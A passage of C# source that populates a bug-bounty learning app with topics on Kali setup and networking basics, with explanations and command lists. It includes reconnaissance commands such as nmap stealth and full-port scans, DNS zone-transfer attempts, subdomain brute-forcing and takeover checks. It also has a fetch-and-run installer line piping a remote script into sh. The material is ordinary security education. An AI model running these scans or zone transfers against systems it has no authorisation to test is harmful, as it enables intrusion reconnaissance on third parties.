                Content = "Customizing your Kali environment improves productivity, reduces repetitive tasks, and creates a workflow tailored to your bug hunting methodology. The best environment is one you've built yourself over time.\n\nTerminal Configuration: The terminal is your primary interface. Customize it with a better prompt showing current directory, git branch, and status. Install tools like tmux for multiplexing multiple sessions.\n\nZSH and Oh-My-ZSH: Many security professionals prefer ZSH over bash for its enhanced features. Oh-My-ZSH adds themes, plugins, and improvements. Plugins like zsh-autosuggestions dramatically improve efficiency.\n\nDesktop Environment: Kali supports multiple desktop environments: XFCE (default, lightweight), KDE, GNOME, and i3. For a minimal bug hunting setup, XFCE with custom panels and shortcuts is popular.\n\nAliases and Functions: Create shortcuts for common commands. An alias 'bb' could navigate to your bug bounty directory. A function 'recon' could run your full recon script.\n\nTmux Configuration: Tmux allows multiple terminal sessions in one window. Essential for running multiple tools simultaneously. Configure with a custom .tmux.conf for better usability.\n\nTool Configuration Files: Many tools have configuration files that can be pre-configured. Burp Suite, Nmap, and others can be configured for your preferences.\n\nAutostart Scripts: Scripts that run on login can set up your environment automatically.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "chsh -s /usr/bin/zsh", Explanation = "Change default shell to ZSH. Requires logout to take effect." },
                    new CommandItem { Text = "sh -c '$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)'", Explanation = "Install Oh-My-ZSH. The most popular ZSH framework." },
                    new CommandItem { Text = "echo 'alias bb=\"cd ~/bugbounty\"' >> ~/.bashrc", Explanation = "Add alias to bashrc. Replace bashrc with zshrc for ZSH." },
                    new CommandItem { Text = "apt install tmux", Explanation = "Install tmux terminal multiplexer." },
                    new CommandItem { Text = "tmux new -s main", Explanation = "Start new tmux session named 'main'." },
                    new CommandItem { Text = "tmux split-window -h", Explanation = "Split tmux window horizontally." },
                    new CommandItem { Text = "cat > ~/.tmux.conf << 'EOF'\nset -g mouse on\nEOF", Explanation = "Enable mouse support in tmux for easier pane management." },
                    new CommandItem { Text = "git config --global user.name 'YourName'", Explanation = "Configure git identity for committing custom tools and scripts." },
                    new CommandItem { Text = "echo 'set number' >> ~/.vimrc", Explanation = "Enable line numbers in vim for editing scripts." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Install and configure ZSH with Oh-My-ZSH", Code = "apt install zsh && chsh -s /usr/bin/zsh" },
                    new StepItem { Number = 2, Description = "Create project aliases in ~/.zshrc or ~/.bashrc", Code = "alias bb='cd ~/bugbounty'" },
                    new StepItem { Number = 3, Description = "Configure tmux with mouse support and better shortcuts", Code = "cat ~/.tmux.conf" },
                    new StepItem { Number = 4, Description = "Set up your directory structure", Code = "mkdir -p ~/bugbounty/{targets,tools,wordlists,reports}" },
                    new StepItem { Number = 5, Description = "Create a setup script for new installations", Code = "#!/bin/bash - Document all your customizations" }
                },
                Tools = new List<string> { "zsh", "Oh-My-ZSH", "tmux", "vim", "nano", "git", "curl", "screen" }
            };

            libraryTopics["Kali_VM"] = new LibraryTopic
            {
                Tag = "Kali_VM",
                Category = "Kali Linux",
                Title = "Virtual Machine Setup Guide",
                Subtitle = "Running Kali Linux as a Virtual Machine",
                Content = "Running Kali Linux as a virtual machine is the recommended approach for most bug bounty hunters. VMs provide isolation, snapshot capabilities, and the ability to run Kali alongside your regular operating system.\n\nVM Software Options: VirtualBox (free, cross-platform) and VMware Workstation/Fusion (paid, better performance) are the two main options. VMware Player is free for non-commercial use.\n\nPre-built Kali VMs: Offensive Security provides pre-built Kali VM images for VirtualBox and VMware. This saves hours of installation time and comes pre-configured.\n\nVM Configuration Best Practices: Allocate at least 4GB RAM (8GB for comfortable usage), 2 CPU cores, and 50GB storage. Enable 3D acceleration for better graphics performance. Use bridged or NAT networking depending on your needs.\n\nSnapshots: One of the biggest advantages of VMs is snapshot capability. Take snapshots before major changes, before installing untrusted tools, and regularly as clean checkpoints.\n\nShared Folders: Configure shared folders between host and guest for easy file transfer. This is essential for moving findings between systems.\n\nGuest Additions: Install VirtualBox Guest Additions or VMware Tools for better integration: clipboard sharing, drag-and-drop, better resolution, and improved performance.\n\nNested Virtualization: Some tools benefit from nested virtualization. Enable this in VM settings if available.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sudo apt install open-vm-tools-desktop", Explanation = "Install VMware Tools in Kali when running in VMware." },
                    new CommandItem { Text = "sudo apt install virtualbox-guest-additions-iso", Explanation = "Install VirtualBox Guest Additions package." },
                    new CommandItem { Text = "sudo /media/cdrom/VBoxLinuxAdditions.run", Explanation = "Run Guest Additions installer from mounted ISO." },
                    new CommandItem { Text = "sudo systemctl restart vboxadd", Explanation = "Restart VirtualBox additions service after update." },
                    new CommandItem { Text = "vboxmanage snapshot 'VMName' take 'SnapshotName'", Explanation = "Take snapshot from command line. Can be automated in scripts." },
                    new CommandItem { Text = "vboxmanage snapshot 'VMName' list", Explanation = "List all snapshots for a VM." },
                    new CommandItem { Text = "vboxmanage snapshot 'VMName' restore 'SnapshotName'", Explanation = "Restore VM to specific snapshot." },
                    new CommandItem { Text = "vboxmanage modifyvm 'VMName' --cpus 4", Explanation = "Modify VM CPU count from command line." },
                    new CommandItem { Text = "vboxmanage modifyvm 'VMName' --memory 8192", Explanation = "Set VM memory to 8GB." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Download VirtualBox from virtualbox.org", Code = "https://www.virtualbox.org/wiki/Downloads" },
                    new StepItem { Number = 2, Description = "Download Kali Linux VM image", Code = "https://www.kali.org/get-kali/#kali-virtual-machines" },
                    new StepItem { Number = 3, Description = "Import .ova file into VirtualBox", Code = "File > Import Appliance > Select .ova file" },
                    new StepItem { Number = 4, Description = "Configure VM settings (RAM, CPU, Storage)", Code = "Machine > Settings > System" },
                    new StepItem { Number = 5, Description = "Start VM and change default password", Code = "passwd" },
                    new StepItem { Number = 6, Description = "Install Guest Additions", Code = "Devices > Insert Guest Additions CD Image" },
                    new StepItem { Number = 7, Description = "Take initial snapshot", Code = "Machine > Take Snapshot > 'Fresh Install'" },
                    new StepItem { Number = 8, Description = "Configure shared folder", Code = "Devices > Shared Folders > Add shared folder" }
                },
                Tools = new List<string> { "VirtualBox", "VMware Workstation", "VMware Fusion", "VMware Player", "VirtualBox Guest Additions", "VMware Tools" }
            };

            libraryTopics["Kali_Dual"] = new LibraryTopic
            {
                Tag = "Kali_Dual",
                Category = "Kali Linux",
                Title = "Dual Boot Installation Guide",
                Subtitle = "Installing Kali Linux Alongside Windows or macOS",
                Content = "Dual booting allows you to run Kali Linux natively alongside your existing operating system. This gives you full hardware access and better performance compared to virtual machines, at the cost of more complex setup and inability to use both systems simultaneously.\n\nWhen to Choose Dual Boot: Choose dual boot if you need maximum performance for intensive tasks, want to use all available RAM without sharing, need to use specialized hardware like wireless adapters with injection support, or find VM management cumbersome.\n\nWhen to Stay with VM: Choose VM if you want the snapshot and isolation features, need to use both OS simultaneously, prioritize safety from accidental data loss, or don't need raw hardware performance.\n\nDisk Partitioning: Kali needs at least 20GB of disk space. You'll need to resize your existing partition and create new partitions for Kali. Back up everything before partitioning.\n\nBoot Manager: GRUB (Grand Unified Bootloader) will manage both operating systems. After installation, GRUB should automatically detect and list both OSes. You can customize the boot menu.\n\nWireless Drivers: One major advantage of native installation is direct hardware access. Kali supports many wireless adapters with injection capabilities that VMs can't use.\n\nKali alongside Windows: The most common dual boot configuration. Windows should be installed first, then Kali. This ensures GRUB is installed correctly.\n\nIMPORTANT: Dual booting carries risks. Back up all data before proceeding. Partitioning errors can cause data loss.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "lsblk", Explanation = "List block devices and partitions. Shows disk layout before installing." },
                    new CommandItem { Text = "fdisk -l", Explanation = "List disk partitions in detail. Run as root." },
                    new CommandItem { Text = "parted -l", Explanation = "List partitions using parted. More detailed than fdisk for modern partition tables." },
                    new CommandItem { Text = "update-grub", Explanation = "Update GRUB bootloader menu. Run after adding new OS or changing config." },
                    new CommandItem { Text = "grub-install /dev/sda", Explanation = "Install GRUB to master boot record. Replace /dev/sda with your disk." },
                    new CommandItem { Text = "os-prober", Explanation = "Detect other operating systems for GRUB menu." },
                    new CommandItem { Text = "cat /etc/fstab", Explanation = "View file system table. Shows auto-mounted partitions." },
                    new CommandItem { Text = "mount /dev/sdb1 /mnt", Explanation = "Mount partition manually. Useful for accessing Windows partition from Kali." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "BACKUP ALL DATA first - partitioning can cause data loss", Code = "Back up to external drive or cloud storage" },
                    new StepItem { Number = 2, Description = "Download Kali Linux ISO", Code = "https://www.kali.org/get-kali/#kali-installer-images" },
                    new StepItem { Number = 3, Description = "Create bootable USB with Rufus or Etcher", Code = "https://www.balena.io/etcher/" },
                    new StepItem { Number = 4, Description = "Resize Windows partition using Disk Management", Code = "Windows: right-click C: drive > Shrink Volume" },
                    new StepItem { Number = 5, Description = "Boot from USB and start Kali installer", Code = "Restart and access boot menu (F12/F2/Del depending on BIOS)" },
                    new StepItem { Number = 6, Description = "Choose 'Graphical Install' and follow prompts", Code = "Select language, timezone, username, password" },
                    new StepItem { Number = 7, Description = "Select 'Manual' partitioning and use free space", Code = "Create /boot (500MB), swap (equal to RAM), / (remaining)" },
                    new StepItem { Number = 8, Description = "Install GRUB bootloader to MBR", Code = "Install to /dev/sda (not /dev/sda1)" }
                },
                Tools = new List<string> { "Rufus", "Etcher", "GParted", "GRUB", "parted", "fdisk" }
            };
        }

        
        private void InitializeNetworking()
        {
            libraryTopics["Net_IP"] = new LibraryTopic
            {
                Tag = "Net_IP",
                Category = "Networking",
                Title = "IP Addresses - Everything Explained",
                Subtitle = "Complete Guide to IP Addressing for Bug Hunters",
                Content = "IP (Internet Protocol) addresses are the foundation of internet communication. Every device on a network has an IP address that uniquely identifies it. Understanding IP addressing is essential for bug hunters, as it affects how you discover targets, interpret scan results, and understand network architecture.\n\nIPv4 Addressing: IPv4 addresses consist of four octets (8-bit numbers) separated by dots: 192.168.1.1. The range is 0-255 per octet, giving approximately 4.3 billion possible addresses. IPv4 is still the dominant protocol on the internet despite address exhaustion.\n\nIP Address Classes: Originally, IP addresses were divided into classes (A, B, C, D, E). Class A: 1.0.0.0 - 126.0.0.0 (large networks). Class B: 128.0.0.0 - 191.255.0.0 (medium networks). Class C: 192.0.0.0 - 223.255.255.0 (small networks). Class D: Reserved for multicast.\n\nPrivate IP Ranges: Some IP ranges are reserved for private networks and not routed on the internet: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.\n\nCIDR Notation: CIDR (Classless Inter-Domain Routing) uses the format IP/prefix to define network ranges. /24 means the first 24 bits are the network portion. 192.168.1.0/24 includes addresses 192.168.1.0 to 192.168.1.255.\n\nSubnet Masks: Related to CIDR, subnet masks define the network boundary. /24 corresponds to 255.255.255.0. /16 corresponds to 255.255.0.0. /8 corresponds to 255.0.0.0.\n\nSpecial Addresses: 127.0.0.1 is localhost. 0.0.0.0 means all interfaces. 255.255.255.255 is broadcast.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "ip addr show", Explanation = "Show all network interfaces and their IP addresses." },
                    new CommandItem { Text = "ifconfig", Explanation = "Legacy command to show network interface configuration including IP." },
                    new CommandItem { Text = "dig +short myip.opendns.com @resolver1.opendns.com", Explanation = "Get your external public IP address." },
                    new CommandItem { Text = "curl ifconfig.me", Explanation = "Get your public IP address using web service." },
                    new CommandItem { Text = "nmap -sn 192.168.1.0/24", Explanation = "Ping scan an entire subnet to find live hosts." },
                    new CommandItem { Text = "ipcalc 192.168.1.0/24", Explanation = "Calculate network information from CIDR notation. Install: apt install ipcalc." },
                    new CommandItem { Text = "nmap -sL 192.168.1.0/24", Explanation = "List all IP addresses in a CIDR range without scanning." },
                    new CommandItem { Text = "whois 8.8.8.8", Explanation = "Lookup who owns an IP address block." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Learn binary-to-decimal conversion for understanding IPs", Code = "128+64+32+16+8+4+2+1 = each bit position value" },
                    new StepItem { Number = 2, Description = "Practice calculating CIDR ranges", Code = "ipcalc 10.10.10.0/24" },
                    new StepItem { Number = 3, Description = "Memorize private IP ranges", Code = "10.x.x.x, 172.16-31.x.x, 192.168.x.x" },
                    new StepItem { Number = 4, Description = "Use nmap to discover live hosts in a range", Code = "nmap -sn 10.10.10.0/24" }
                },
                Tools = new List<string> { "ipcalc", "nmap", "ip", "ifconfig", "whois", "curl", "dig" }
            };

            libraryTopics["Net_Ports"] = new LibraryTopic
            {
                Tag = "Net_Ports",
                Category = "Networking",
                Title = "Ports - Complete Reference Guide",
                Subtitle = "Understanding TCP/UDP Ports for Security Testing",
                Content = "Ports are logical endpoints for network communication. Every service that accepts network connections listens on a specific port number. Understanding ports helps you identify services running on targets, understand what's expected vs unexpected, and focus testing on appropriate services.\n\nPort Ranges: Ports range from 0 to 65535. Well-known ports (0-1023) are reserved for standard services and require root to bind. Registered ports (1024-49151) are for user applications. Dynamic/private ports (49152-65535) are for temporary connections.\n\nCommon Ports Every Bug Hunter Must Know:\nPort 21: FTP (File Transfer Protocol)\nPort 22: SSH (Secure Shell)\nPort 23: Telnet (unencrypted remote access)\nPort 25: SMTP (Email sending)\nPort 53: DNS (Domain Name System)\nPort 80: HTTP (Web traffic)\nPort 443: HTTPS (Encrypted web traffic)\nPort 3306: MySQL database\nPort 3389: RDP (Remote Desktop Protocol)\nPort 5432: PostgreSQL database\nPort 6379: Redis\nPort 8080: Alternative HTTP (often used by apps/proxies)\nPort 8443: Alternative HTTPS\n\nIdentifying Services on Ports: Port numbers tell you what service is likely running, but services can run on non-standard ports. Always verify with banner grabbing or service detection (-sV in nmap).\n\nOpen, Closed, and Filtered: Open - service is listening and accepting connections. Closed - no service but port is accessible. Filtered - firewall is blocking the port.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "nmap -p 1-65535 target.com", Explanation = "Scan all ports. Slow but comprehensive." },
                    new CommandItem { Text = "nmap -p- target.com", Explanation = "Shorthand to scan all 65535 ports." },
                    new CommandItem { Text = "nmap -p 80,443,8080,8443 target.com", Explanation = "Scan specific ports. Separate multiple ports with commas." },
                    new CommandItem { Text = "nmap --top-ports 1000 target.com", Explanation = "Scan the 1000 most common ports. Good balance of speed and coverage." },
                    new CommandItem { Text = "nc -zv target.com 80", Explanation = "Test if specific port is open using netcat." },
                    new CommandItem { Text = "nmap -sV target.com", Explanation = "Service version detection. Identifies what service is running on each port." },
                    new CommandItem { Text = "curl -v http://target.com:8080", Explanation = "Test HTTP service on non-standard port." },
                    new CommandItem { Text = "ss -tulpn | grep LISTEN", Explanation = "Show all listening ports on local machine." }
                },
                Tools = new List<string> { "nmap", "netcat", "masscan", "rustscan", "ss", "netstat" }
            };

            libraryTopics["Net_TCP_UDP"] = new LibraryTopic
            {
                Tag = "Net_TCP_UDP",
                Category = "Networking",
                Title = "TCP vs UDP - Deep Comparison",
                Subtitle = "Understanding Transport Layer Protocols",
                Content = "TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are the two main transport layer protocols. Understanding their differences is crucial for bug hunters because it affects how you scan, what services you find, and how you interact with them.\n\nTCP: Connection-oriented protocol. Before data transfer, a three-way handshake establishes a connection: SYN -> SYN-ACK -> ACK. TCP guarantees delivery, ordering, and error checking. It's slower but reliable. Most web services use TCP.\n\nThe Three-Way Handshake: Client sends SYN (synchronize), server responds with SYN-ACK (synchronize-acknowledge), client sends ACK (acknowledge). Only after this handshake is the connection established.\n\nUDP: Connectionless protocol. No handshake, just send data. Faster but unreliable - packets may be lost, duplicated, or arrive out of order. Used where speed matters more than reliability: DNS, VoIP, video streaming, gaming.\n\nTCP for Bug Hunting: Most web vulnerabilities are in TCP services. HTTP, HTTPS, SSH, FTP, databases all use TCP. Nmap scans TCP by default.\n\nUDP for Bug Hunting: UDP services can have vulnerabilities too. DNS (UDP 53) is a common target. SNMP (UDP 161) can expose sensitive information. UDP scanning is slower and less reliable.\n\nPort States: TCP can be Open, Closed, or Filtered. UDP can be Open, Open|Filtered (harder to detect), or Closed.\n\nFirewall Interaction: TCP SYN scans can distinguish between closed ports (RST) and filtered ports (no response). UDP scanning often relies on ICMP port unreachable messages.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "nmap -sT target.com", Explanation = "Full TCP connect scan. Completes three-way handshake. More detectable but reliable." },
                    new CommandItem { Text = "nmap -sS target.com", Explanation = "TCP SYN scan (stealth scan). Sends SYN, doesn't complete handshake. Faster and less detectable." },
                    new CommandItem { Text = "nmap -sU target.com", Explanation = "UDP scan. Slower but essential for finding DNS, SNMP, and other UDP services." },
                    new CommandItem { Text = "nmap -sU -p 53,67,68,69,123,161,162 target.com", Explanation = "Scan common UDP ports for DNS, DHCP, TFTP, NTP, SNMP." },
                    new CommandItem { Text = "nc -u target.com 53", Explanation = "Connect to UDP service using netcat. -u flag for UDP." },
                    new CommandItem { Text = "tcpdump -i eth0 tcp port 80", Explanation = "Capture TCP traffic on port 80. Shows packets in real-time." },
                    new CommandItem { Text = "tcpdump -i eth0 udp", Explanation = "Capture all UDP traffic." },
                    new CommandItem { Text = "nmap -sA target.com", Explanation = "TCP ACK scan. Used to map firewall rules - shows filtered vs unfiltered." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Understand TCP three-way handshake with tcpdump", Code = "tcpdump -i eth0 host target.com" },
                    new StepItem { Number = 2, Description = "Compare TCP and UDP scan results", Code = "nmap -sT -sU target.com" },
                    new StepItem { Number = 3, Description = "Practice identifying services from port numbers", Code = "nmap -sV target.com" },
                    new StepItem { Number = 4, Description = "Use Wireshark to visualize protocol differences", Code = "wireshark -k -i eth0" }
                },
                Tools = new List<string> { "nmap", "tcpdump", "Wireshark", "netcat", "masscan" }
            };

            libraryTopics["Net_DNS"] = new LibraryTopic
            {
                Tag = "Net_DNS",
                Category = "Networking",
                Title = "DNS - How It Really Works",
                Subtitle = "Complete DNS Guide for Security Researchers",
                Content = "DNS (Domain Name System) translates human-readable domain names to IP addresses. It's a critical component of the internet, and understanding it deeply is essential for recon, attack surface mapping, and finding vulnerabilities.\n\nDNS Hierarchy: DNS is hierarchical. At the top are root servers (13 clusters). Below are TLD servers (.com, .org, .net). Below are authoritative name servers for each domain. Resolvers query this hierarchy to resolve names.\n\nDNS Record Types:\nA Record: Maps hostname to IPv4 address\nAAAA Record: Maps hostname to IPv6 address\nCNAME Record: Alias pointing to another hostname\nMX Record: Mail server for domain\nNS Record: Name server for domain\nTXT Record: Text data (used for SPF, DKIM, verification)\nSOA Record: Start of Authority, zone information\nPTR Record: Reverse lookup, IP to hostname\nSRV Record: Service location record\nCAA Record: Certificate Authority Authorization\n\nDNS for Bug Bounty: DNS reconnaissance reveals subdomains, mail servers, infrastructure, and technology choices. Zone transfers (AXFR) can dump all DNS records at once if misconfigured. Certificate transparency logs reveal historical subdomains.\n\nDNS Security Issues: DNS zone transfers, DNS cache poisoning, DNS rebinding, subdomain takeover, and DNS amplification attacks are all relevant for bug bounty.\n\nSubdomain Takeover via DNS: If a CNAME points to an expired third-party service (like an old Heroku/GitHub Pages URL), an attacker can register that service and take over the subdomain.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "dig target.com A", Explanation = "Query A records (IPv4) for a domain. Shows the IP address." },
                    new CommandItem { Text = "dig target.com ANY", Explanation = "Query all record types. Shows everything configured for the domain." },
                    new CommandItem { Text = "dig target.com MX", Explanation = "Query mail server records. Reveals email infrastructure." },
                    new CommandItem { Text = "dig target.com NS", Explanation = "Query name server records. Shows which DNS servers control the domain." },
                    new CommandItem { Text = "dig target.com TXT", Explanation = "Query text records. May reveal SPF, DKIM, verification codes, and other info." },
                    new CommandItem { Text = "dig @ns1.target.com target.com AXFR", Explanation = "Attempt DNS zone transfer. If allowed, dumps ALL DNS records. Often blocked." },
                    new CommandItem { Text = "dig -x 8.8.8.8", Explanation = "Reverse DNS lookup. Converts IP address to hostname." },
                    new CommandItem { Text = "host -t any target.com", Explanation = "Query all record types using host command. Alternative to dig." },
                    new CommandItem { Text = "nslookup target.com", Explanation = "Interactive DNS lookup. Works on all platforms." },
                    new CommandItem { Text = "dig target.com +trace", Explanation = "Trace the full DNS resolution path from root servers." },
                    new CommandItem { Text = "dig @8.8.8.8 target.com", Explanation = "Query specific DNS server (Google's 8.8.8.8). Bypass local DNS cache." },
                    new CommandItem { Text = "dnsrecon -d target.com -t brt -D wordlist.txt", Explanation = "DNS bruteforce for subdomains using dnsrecon tool." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Enumerate all DNS records for target", Code = "dig target.com ANY" },
                    new StepItem { Number = 2, Description = "Attempt zone transfer", Code = "dig @ns1.target.com target.com AXFR" },
                    new StepItem { Number = 3, Description = "Find subdomains via DNS brute force", Code = "dnsrecon -d target.com -t brt" },
                    new StepItem { Number = 4, Description = "Check for CNAME to external services (takeover potential)", Code = "dig sub.target.com CNAME" },
                    new StepItem { Number = 5, Description = "Review TXT records for sensitive information", Code = "dig target.com TXT" }
                },
                Tools = new List<string> { "dig", "nslookup", "host", "dnsrecon", "dnsx", "amass", "subfinder", "massdns" }
            };

            libraryTopics["Net_HTTP"] = new LibraryTopic
            {
                Tag = "Net_HTTP",
                Category = "Networking",
                Title = "HTTP/HTTPS Complete Guide",
                Subtitle = "Understanding Web Protocol for Security Testing",
                Content = "HTTP (HyperText Transfer Protocol) and HTTPS (HTTP Secure) are the foundation of web communication. As a bug hunter focused on web applications, you'll spend most of your time working with HTTP. Understanding it deeply is essential.\n\nHTTP Request Structure: Every HTTP request has a method, URL, headers, and optionally a body.\nMethods: GET (retrieve data), POST (submit data), PUT (update resource), DELETE (remove resource), PATCH (partial update), HEAD (headers only), OPTIONS (available methods).\nHeaders: Host, User-Agent, Cookie, Authorization, Content-Type, Accept, Referer, X-Forwarded-For, and many others.\nBody: Present in POST/PUT/PATCH requests. Formats: form data, JSON, XML, multipart.\n\nHTTP Response Structure: Status code, headers, and body.\nStatus Codes: 1xx (informational), 2xx (success), 3xx (redirect), 4xx (client error), 5xx (server error).\n\nKey Security Headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, X-XSS-Protection, Referrer-Policy, Permissions-Policy.\n\nHTTPS: HTTPS wraps HTTP in TLS (Transport Layer Security) encryption. Certificates authenticate servers. Man-in-the-middle attacks are prevented by certificate verification.\n\nHTTP Versions: HTTP/1.0 (one request per connection), HTTP/1.1 (keep-alive, most common), HTTP/2 (multiplexing, binary), HTTP/3 (QUIC transport).\n\nCookies and Sessions: Cookies store session tokens and user preferences. Secure cookies are only sent over HTTPS. HttpOnly cookies can't be accessed by JavaScript. SameSite controls cross-site cookie sending.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl -v https://target.com", Explanation = "Verbose HTTP request. Shows headers, timing, and full response. Essential for analysis." },
                    new CommandItem { Text = "curl -I https://target.com", Explanation = "HEAD request - get only headers without body. Shows security headers quickly." },
                    new CommandItem { Text = "curl -X POST -d 'param=value' https://target.com/api", Explanation = "POST request with form data. Essential for testing API endpoints." },
                    new CommandItem { Text = "curl -H 'Cookie: session=abc123' https://target.com/admin", Explanation = "Add custom headers to request. Test with different cookies/tokens." },
                    new CommandItem { Text = "curl -L https://target.com", Explanation = "Follow redirects. Useful for finding final destination of shortened URLs." },
                    new CommandItem { Text = "curl -X OPTIONS https://target.com -v", Explanation = "Check allowed HTTP methods. May reveal unexpected capabilities." },
                    new CommandItem { Text = "curl -k https://target.com", Explanation = "Ignore SSL certificate errors. -k or --insecure. For testing only." },
                    new CommandItem { Text = "wget --save-headers https://target.com", Explanation = "Download page and save headers. Useful for offline analysis." },
                    new CommandItem { Text = "python3 -c \"import requests; r=requests.get('https://target.com'); print(r.headers)\"", Explanation = "Python one-liner to fetch and display HTTP response headers." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Intercept and analyze HTTP traffic with Burp Suite", Code = "Configure browser proxy to 127.0.0.1:8080" },
                    new StepItem { Number = 2, Description = "Check all security headers", Code = "curl -I https://target.com" },
                    new StepItem { Number = 3, Description = "Test all HTTP methods on endpoints", Code = "curl -X OPTIONS https://target.com -v" },
                    new StepItem { Number = 4, Description = "Analyze cookies for security flags", Code = "curl -v https://target.com | grep -i 'set-cookie'" },
                    new StepItem { Number = 5, Description = "Test HTTPS redirect from HTTP", Code = "curl -v http://target.com" }
                },
                Tools = new List<string> { "Burp Suite", "curl", "wget", "httpx", "Postman", "Insomnia", "Firefox DevTools" }
            };

            libraryTopics["Net_Subdomains"] = new LibraryTopic
            {
                Tag = "Net_Subdomains",
                Category = "Networking",
                Title = "Subdomains and Domains Explained",
                Subtitle = "Understanding Domain Architecture for Bug Hunting",
                Content = "Understanding domain hierarchy is crucial for reconnaissance and attack surface mapping. Domains and subdomains define the scope of what you're testing and where to focus your efforts.\n\nDomain Structure: A fully qualified domain name (FQDN) consists of multiple parts: www.subdomain.target.com. From right to left: .com (TLD), target (second-level domain), subdomain (subdomain), www (hostname).\n\nTop-Level Domains (TLDs): .com, .org, .net, .edu are generic TLDs. .uk, .de, .jp are country-code TLDs (ccTLDs). .io, .ai, .app are newer generic TLDs. Second-level domains under ccTLDs: .co.uk, .com.au.\n\nSubdomains for Bug Bounty: Subdomains are the primary expansion vector in bug bounty recon. A company may have hundreds of subdomains, each with different technology and potentially different vulnerability profiles. admin.target.com, api.target.com, dev.target.com, test.target.com are high-value targets.\n\nSubdomain Discovery Methods: DNS brute force, certificate transparency logs, search engines, web archives, DNS zone transfers, and passive DNS databases all help discover subdomains.\n\nWildcard Subdomains: Some domains have wildcard DNS records (*.target.com) that resolve any subdomain. This can be tricky for subdomain enumeration as everything appears to resolve.\n\nDangling Subdomains: Subdomains that point to expired or unclaimed resources can be taken over. CNAME records pointing to deleted third-party services are common vectors.\n\nDomain Registrar Information: WHOIS records show registration details, name servers, and registration dates. This helps understand domain structure and history.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "subfinder -d target.com", Explanation = "Fast passive subdomain enumeration using multiple sources." },
                    new CommandItem { Text = "amass enum -d target.com", Explanation = "Comprehensive active and passive subdomain enumeration." },
                    new CommandItem { Text = "gobuster dns -d target.com -w wordlist.txt", Explanation = "DNS brute force subdomain enumeration." },
                    new CommandItem { Text = "dig target.com NS", Explanation = "Find authoritative name servers for the domain." },
                    new CommandItem { Text = "cat subdomains.txt | httpx -sc -title", Explanation = "Check which discovered subdomains are alive and get their titles." },
                    new CommandItem { Text = "whois target.com", Explanation = "Get domain registration information." },
                    new CommandItem { Text = "crt.sh/?q=%.target.com&output=json", Explanation = "Query certificate transparency logs at crt.sh for historical subdomains." },
                    new CommandItem { Text = "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u", Explanation = "Parse crt.sh JSON output to extract unique subdomains." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Start with passive subdomain enumeration", Code = "subfinder -d target.com -o subdomains.txt" },
                    new StepItem { Number = 2, Description = "Add certificate transparency results", Code = "curl 'https://crt.sh/?q=%.target.com&output=json' | jq '.[].name_value' | sort -u >> subdomains.txt" },
                    new StepItem { Number = 3, Description = "Filter live subdomains", Code = "cat subdomains.txt | httpx -o live_subdomains.txt" },
                    new StepItem { Number = 4, Description = "Check for subdomain takeover potential", Code = "subzy run --targets live_subdomains.txt" },
                    new StepItem { Number = 5, Description = "Take screenshots of live subdomains", Code = "aquatone -out screenshots/ < live_subdomains.txt" }
                },
                Tools = new List<string> { "subfinder", "amass", "gobuster", "httpx", "aquatone", "subzy", "dnsx", "massdns" }
            };

            libraryTopics["Net_OSI"] = new LibraryTopic
            {
                Tag = "Net_OSI",
                Category = "Networking",
                Title = "OSI Model Layer by Layer",
                Subtitle = "Understanding Network Layers for Security Testing",
                Content = "The OSI (Open Systems Interconnection) model is a conceptual framework that describes how network communication works across seven layers. Understanding the OSI model helps you understand where different attacks occur, how tools interact with networks, and how to troubleshoot connectivity issues.\n\nLayer 7 - Application: Highest layer, closest to the user. Protocols: HTTP, HTTPS, FTP, SSH, DNS, SMTP. This is where most web application vulnerabilities exist.\n\nLayer 6 - Presentation: Data formatting, encryption, compression. TLS/SSL operates here. This is where certificate-related attacks occur.\n\nLayer 5 - Session: Establishes and manages sessions. Session fixation attacks target this layer.\n\nLayer 4 - Transport: TCP and UDP. Port numbers live here. Port scanning operates at this layer.\n\nLayer 3 - Network: IP addressing and routing. Ping, traceroute, and IP-based attacks work here. Nmap ICMP probes operate here.\n\nLayer 2 - Data Link: MAC addresses, frames. ARP is here. ARP poisoning and MAC flooding attacks target this layer.\n\nLayer 1 - Physical: Physical media, bits. Ethernet cables, wifi signals. Physical attacks and wireless sniffing target this layer.\n\nBug Bounty Relevance: As a web bug bounty hunter, you'll primarily work at layers 4-7. Port scanning (layer 4), SSL/TLS analysis (layer 6), and web application testing (layer 7) are your main focus areas.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "ping target.com", Explanation = "ICMP ping - Layer 3 connectivity test." },
                    new CommandItem { Text = "traceroute target.com", Explanation = "Trace route through network layers, showing each hop." },
                    new CommandItem { Text = "nmap target.com", Explanation = "Port scanning - primarily Layer 4 operation." },
                    new CommandItem { Text = "sslyze target.com", Explanation = "SSL/TLS analysis - Layer 6 testing." },
                    new CommandItem { Text = "curl https://target.com", Explanation = "HTTP request - Layer 7 application communication." },
                    new CommandItem { Text = "arp -n", Explanation = "Show ARP table - Layer 2 MAC to IP mappings." },
                    new CommandItem { Text = "wireshark", Explanation = "Network packet analyzer covering all OSI layers." }
                },
                Steps = new List<StepItem>
                {
